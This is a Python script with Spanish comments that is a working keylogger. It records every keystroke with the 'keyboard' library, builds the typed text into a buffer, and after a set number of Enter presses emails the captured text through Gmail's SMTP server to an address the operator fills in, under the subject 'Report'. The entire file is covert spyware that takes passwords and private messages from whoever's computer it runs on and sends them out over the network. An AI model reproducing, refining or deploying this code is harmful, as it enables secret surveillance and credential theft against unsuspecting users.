import keyboard as key 

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib

import datetime

correo = '' #Escribir el correo que se va a usar para enviar el mensaje solo puede ser gmail
contraseña_del_correo = '' #Contraseña del correo a utilizar
destinatario = '' #Correo a enviar el mensaje
enters = 2  #Envia un mensaje cuando llegue al nuemero de enter determinado 

Text = ""
enter = 0


while True:
    Recorded = str(key.read_event())

    if Recorded == "KeyboardEvent(enter up)": #detecta cuantos enters a hecho
        enter += 1
    
    #Aqui renplaza las letras como el espacio o el enter ej: renplaza el "enter up" por un salto de linea
    if Recorded.__contains__('up'):
        Recorded = Recorded.replace('KeyboardEvent(', '')
        Recorded = Recorded.replace(' up)', '')
        Recorded = Recorded.replace('enter', '\n')
        Recorded = Recorded.replace('space', ' ')
        Recorded = Recorded.replace('back', '" BORRAR "')

        if (len(Recorded)>1):
            Text = Text + " " + Recorded + " "
        else:
            Text = Text + Recorded

    if enter == enters: 
        try:
            msg = MIMEMultipart()

            msg['From']=correo
            msg['To']=destinatario
            msg['Subject']="Report "+ str(datetime.datetime.now().date())

            msg.attach(MIMEText(Text, 'plain'))

            server = smtplib.SMTP('smtp.gmail.com: 587')
            server.starttls()

            server.login(msg['From'], contraseña_del_correo)

            server.sendmail(msg['From'], msg['To'], msg.as_string())

            server.quit()

            Text=""
            enter = 0


        except:
            print("Error")